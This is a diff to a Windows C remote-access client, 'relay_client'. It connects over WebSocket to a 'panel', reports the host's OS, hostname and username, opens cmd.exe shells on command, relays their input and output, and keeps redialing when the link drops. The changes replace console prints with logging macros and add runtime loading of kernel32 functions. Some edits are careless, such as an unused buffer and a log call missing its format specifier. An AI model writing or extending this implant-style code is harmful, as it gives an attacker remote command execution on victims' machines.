@@ -42,7 +42,6 @@
 
 #include <windows.h>
 #include <winhttp.h>
-#include <stdio.h>
 
 #include "string.h"     /* strcmp (the -v flag) */
 #include "protocol.h"
@@ -54,6 +53,9 @@
 #include "types.h"
 #include "wintypes.h"
 #include "memory.h"
+#include "logger.h"
+#include "kernel32.h"
+
 
 /* Commit tag baked into the identity frame. CI overrides it with
  * -DAGENT_COMMIT_HASH="<8-char git hash>"; local builds keep the study tag. */
@@ -110,17 +112,19 @@ static DWORD handle_hello(HINTERNET socket)
 {
     system_facts facts;
     collect_system_facts(&facts);
-
+    LOG_INFO("OS version %s, hostname %s, user %s\n",
+             facts.os_version, facts.hostname, facts.username);
+             CHAR buffer[128];
+             
     unsigned char frame[IDENTITY_FRAME_SIZE];
     int frame_len = build_identity_frame(frame, &facts);
 
     DWORD err = ws_send(socket, frame, (DWORD)frame_len);
     if (err != NO_ERROR)
         return err;
-    printf("[+] identity sent to the panel (%d bytes)\n", frame_len);
+    LOG_INFO("Identity sent to the panel (%d bytes)\n", frame_len);
     if (verbose)
         print_identity_frame(frame, frame_len);
-    fflush(stdout);
     return NO_ERROR;
 }
 
@@ -133,7 +137,7 @@ static DWORD handle_open_shell(HINTERNET socket)
     if (id < 0) {
         unsigned char status_error[4] = {1, 0, 0, 0};
         err = ws_send(socket, status_error, sizeof(status_error));
-        printf("[i] OpenShell failed - replied status 1\n");
+        LOG_ERROR("OpenShell failed - replied status 1\n");
     } else {
         /* Exactly 12 bytes: the panel reads the id only when the
          * reply is at least this long, else it assumes id 0. */
@@ -142,9 +146,8 @@ static DWORD handle_open_shell(HINTERNET socket)
         write_u32_le(reply, &pos, STATUS_OK);
         write_u64_le(reply, &pos, (unsigned long long)id);
         err = ws_send(socket, reply, sizeof(reply));
-        printf("[+] shell %d opened (cmd.exe spawned) - id sent\n", id);
+        LOG_INFO("Shell %d opened (cmd.exe spawned) - id sent\n", id);
     }
-    fflush(stdout);
     return err;
 }
 
@@ -172,9 +175,7 @@ static DWORD handle_write_shell(HINTERNET socket, const incoming_message *msg)
     reply[0] = (unsigned char)status;
     DWORD err = ws_send(socket, reply, sizeof(reply));
     if (err == NO_ERROR) {
-        printf("[%s] write to shell %llu - status %d\n",
-               slot ? "+" : "!", id, status);
-        fflush(stdout);
+        LOG_INFO("Write to shell %llu - status %d\n", id, status);
     }
     return err;
 }
@@ -194,7 +195,7 @@ static DWORD handle_read_shell(HINTERNET socket, const incoming_message *msg)
     if (!slot) {
         err = ws_send(socket, status_error, sizeof(status_error));
         if (err == NO_ERROR)
-            printf("[!] read shell %llu - unknown id, status 1\n", id);
+            LOG_ERROR("Read shell %llu - unknown id, status 1\n", id);
     } else {
         static unsigned char chunk[4 + SHELL_READ_CHUNK + 1];
         DWORD got = 0;
@@ -203,8 +204,7 @@ static DWORD handle_read_shell(HINTERNET socket, const incoming_message *msg)
         if (r == SHELL_READ_DEAD) {
             err = ws_send(socket, status_error, sizeof(status_error));
             if (err == NO_ERROR)
-                printf("[!] shell %llu exited - status 1, slot freed\n",
-                       id);
+                LOG_ERROR("Shell %llu exited - status 1, slot freed\n", id);
         } else {
             /* [status:4][chunk][NUL] - the NUL terminator is part of the
              * v4 contract and is written explicitly (the panel strips
@@ -215,14 +215,12 @@ static DWORD handle_read_shell(HINTERNET socket, const incoming_message *msg)
             err = ws_send(socket, chunk, 4 + got + 1);
             if (err == NO_ERROR) {
                 if (r == SHELL_READ_IDLE)
-                    printf("[i] read shell %llu - idle\n", id);
+                    LOG_INFO("Read shell %llu - idle\n", id);
                 else
-                    printf("[+] read shell %llu - %lu byte(s)\n",
-                           id, got);
+                    LOG_INFO("Read shell %llu - %lu byte(s)\n", id, got);
             }
         }
     }
-    fflush(stdout);
     return err;
 }
 
@@ -236,15 +234,15 @@ static DWORD handle_close_shell(HINTERNET socket, const incoming_message *msg)
     shell_slot *slot = shell_lookup(id);
     if (slot) {
         shell_teardown(slot);
-        printf("[+] shell %llu closed (cmd.exe terminated)\n", id);
+        LOG_INFO("Shell %llu closed (cmd.exe terminated)\n", id);
     } else {
-        printf("[i] close shell %llu - not open (still ok)\n", id);
+        LOG_INFO("Close shell %llu - not open (still ok)\n", id);
     }
 
     unsigned char reply[4] = {0, 0, 0, 0};
     DWORD err = ws_send(socket, reply, sizeof(reply));
     if (err == NO_ERROR)
-        fflush(stdout);
+        LOG_INFO("No error reply sent for CloseShell %llu\n", id);
     return err;
 }
 
@@ -257,20 +255,21 @@ static int run_session(const WCHAR *url, int *long_lived);
 
 int main(int argc, CHAR *argv[])
 {
+    KERNEL32 kernel;
+    if (!KERNEL32_Ctor(&kernel)) {
+        LOG_ERROR("Failed to load kernel32.dll\n");
+    }
     /* ----- Stage 1: the URL must come from the command line ----- */
     if (argc == 3 && strcmp(argv[2], "-v") == 0)
         verbose = 1;
     else if (argc != 2) {
-        fprintf(stderr,
-                "usage: relay_client.exe <URL> [-v]\n"
-                "example: relay_client.exe https://relay.example.com/agent\n"
-                "-v = verbose: dump every command's raw bytes\n");
+        LOG_ERROR("Usage: %s <URL> [-v]\n", argv[0]);
         return 1;
     }
 
     WCHAR url[2048];
     if (MultiByteToWideChar(CP_ACP, 0, argv[1], -1, url, 2048) == 0) {
-        print_error_code("MultiByteToWideChar(URL)", GetLastError());
+        LOG_ERROR("MultiByteToWideChar(URL)", kernel.GetLastError());
         return 1;
     }
 
@@ -300,8 +299,7 @@ int main(int argc, CHAR *argv[])
             else if (backoff_pos + 1 < backoff_count)
                 backoff_pos++;
 
-            printf("[i] connection lost - redialing in %d s ...\n", wait_s);
-            fflush(stdout);
+            LOG_INFO("[i] connection lost - redialing in %d s ...\n", wait_s);
             Sleep((DWORD)wait_s * 1000);
         }
     }
@@ -319,6 +317,10 @@ static int run_session(const WCHAR *url, int *long_lived)
     int       rc = RC_SESSION_LOST;     /* default: dial again          */
     HINTERNET session = NULL, connection = NULL, request = NULL;
     HINTERNET socket = NULL;
+    KERNEL32 kernel32;
+    if (!KERNEL32_Ctor(&kernel32)) {
+        LOG_ERROR("Failed to load kernel32.dll\n");
+    }
 
     *long_lived = 0;                    /* set on the first served reply */
 
@@ -333,35 +335,35 @@ static int run_session(const WCHAR *url, int *long_lived)
     uc.lpszUrlPath     = path;  uc.dwUrlPathLength  = 2048;
 
     if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
-        print_error_code("WinHttpCrackUrl (invalid URL?)", GetLastError());
+        LOG_ERROR("WinHttpCrackUrl (invalid URL?) failed: %lu\n", kernel32.GetLastError());
         rc = RC_LOCAL_ERROR;          /* a bad URL will not heal itself */
         goto cleanup;
     }
     if (uc.nScheme != INTERNET_SCHEME_HTTP &&
         uc.nScheme != INTERNET_SCHEME_HTTPS) {
-        fprintf(stderr, "[!] only http:// and https:// URLs are supported\n");
+        LOG_ERROR("Only http:// and https:// URLs are supported\n");
         rc = RC_LOCAL_ERROR;
         goto cleanup;
     }
     if (uc.dwHostNameLength == 0) {
-        fprintf(stderr, "[!] URL has no host name\n");
+        LOG_ERROR("URL has no host name\n");
         rc = RC_LOCAL_ERROR;
         goto cleanup;
     }
     BOOL https = (uc.nScheme == INTERNET_SCHEME_HTTPS);
 
     /* ----- Stage 3: session -> connection -> upgrade request ----- */
-    printf("[1] Connecting to %ls://%ls%ls ... ",
+    LOG_INFO("Connecting to %ls://%ls%ls ... ",
            https ? L"https" : L"http", uc.lpszHostName, uc.lpszUrlPath);
-    fflush(stdout);
+    
 
     session = WinHttpOpen(L"relay_client/1.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!session) { print_error_code("WinHttpOpen", GetLastError()); goto cleanup; }
+    if (!session) { LOG_ERROR("WinHttpOpen failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
     connection = WinHttpConnect(session, uc.lpszHostName, uc.nPort, 0);
-    if (!connection) { print_error_code("WinHttpConnect", GetLastError()); goto cleanup; }
+    if (!connection) { LOG_ERROR("WinHttpConnect failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
     /* An ordinary HTTPS GET - the WebSocket headers are added by the
      * UPGRADE option below, not by us. */
@@ -370,40 +372,39 @@ static int run_session(const WCHAR *url, int *long_lived)
     request = WinHttpOpenRequest(connection, L"GET", uc.lpszUrlPath, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, request_flags);
-    if (!request) { print_error_code("WinHttpOpenRequest", GetLastError()); goto cleanup; }
+    if (!request) { LOG_ERROR("WinHttpOpenRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
     /* This option takes no buffer: lpBuffer must be NULL and length 0. */
     if (!WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,
                           NULL, 0)) {
-        print_error_code("WinHttpSetOption(UPGRADE_TO_WEB_SOCKET)",
-                         GetLastError());
+        LOG_ERROR("WinHttpSetOption(UPGRADE_TO_WEB_SOCKET) failed: %lu\n", kernel32.GetLastError());
         goto cleanup;
     }
 
     if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
-        print_error_code("WinHttpSendRequest", GetLastError()); goto cleanup;
+        LOG_ERROR("WinHttpSendRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup;
     }
 
     /* Required step: receive the handshake response ("101 Switching
      * Protocols") before completing the upgrade. */
     if (!WinHttpReceiveResponse(request, NULL)) {
-        print_error_code("WinHttpReceiveResponse", GetLastError()); goto cleanup;
+        LOG_ERROR("WinHttpReceiveResponse failed: %lu\n", kernel32.GetLastError()); goto cleanup;
     }
 
     /* Finish the handshake; the request handle is spent and gets closed. */
     socket = WinHttpWebSocketCompleteUpgrade(request, 0);
     if (!socket) {
-        print_error_code("WinHttpWebSocketCompleteUpgrade", GetLastError());
+        LOG_ERROR("WinHttpWebSocketCompleteUpgrade failed: %lu\n", kernel32.GetLastError());
         goto cleanup;
     }
     WinHttpCloseHandle(request);
     request = NULL;
-    printf("connected (HTTP 101 Switching Protocols)\n");
+    LOG_INFO("Connected (HTTP 101 Switching Protocols)\n");
 
     /* ----- Stage 4: serve commands. Every request gets exactly one reply
      * - except Exit, which gets none and terminates the agent. ----- */
-    printf("[2] Agent mode: replying to commands (capability mask = Shell)...\n");
+    LOG_INFO("[2] Agent mode: replying to commands (capability mask = Shell)...\n");
     for (int index = 1; ; index++) {
         *long_lived = 1;                /* a command arrived on this wire */
         incoming_message msg;
@@ -411,12 +412,11 @@ static int run_session(const WCHAR *url, int *long_lived)
 
         DWORD err = ws_receive(socket, &msg, &closed);
         if (err != NO_ERROR) {
-            print_error_code("WinHttpWebSocketReceive", err);
+            LOG_ERROR("WinHttpWebSocketReceive failed: %lu\n", err);
             goto cleanup;             /* rc stays SESSION_LOST -> redial */
         }
         if (closed) {
-            fprintf(stderr,
-                    "[!] Server closed the connection - redialing.\n");
+            LOG_ERROR("Server closed the connection - redialing.\n");
             goto cleanup;             /* a close frame is also just a loss */
         }
 
@@ -431,18 +431,16 @@ static int run_session(const WCHAR *url, int *long_lived)
             unsigned char status_error[4] = {1, 0, 0, 0};
             err = ws_send(socket, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
-                printf("[!] message over %d bytes - refused, status 1\n",
+                LOG_ERROR("Message over %d bytes - refused, status 1\n",
                        MAX_MESSAGE_SIZE);
-                fflush(stdout);
                 continue;
             }
-            print_error_code("WinHttpWebSocketSend(reply)", err);
+            LOG_ERROR("WinHttpWebSocketSend(reply) failed: %lu\n", err);
             goto cleanup;
         }
 
         if (opcode == CMD_EXIT) {       /* Exit: no reply, terminate now */
-            printf("[!] Exit requested - terminating.\n");
-            fflush(stdout);
+            LOG_ERROR("Exit requested - terminating.\n");
             rc = RC_EXIT;               /* a valid command, not an error */
             goto cleanup;               /* spec: terminate immediately  */
         }
@@ -461,13 +459,12 @@ static int run_session(const WCHAR *url, int *long_lived)
             unsigned char status_error[4] = {1, 0, 0, 0};
             err = ws_send(socket, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
-                printf("[i] command 0x%02x not implemented - replied status 1\n",
+                LOG_INFO("Command 0x%02x not implemented - replied status 1\n",
                        opcode);
-                fflush(stdout);
             }
         }
         if (err != NO_ERROR) {
-            print_error_code("WinHttpWebSocketSend(reply)", err);
+            LOG_ERROR("WinHttpWebSocketSend(reply) failed: %lu\n", err);
             goto cleanup;
         }
     }
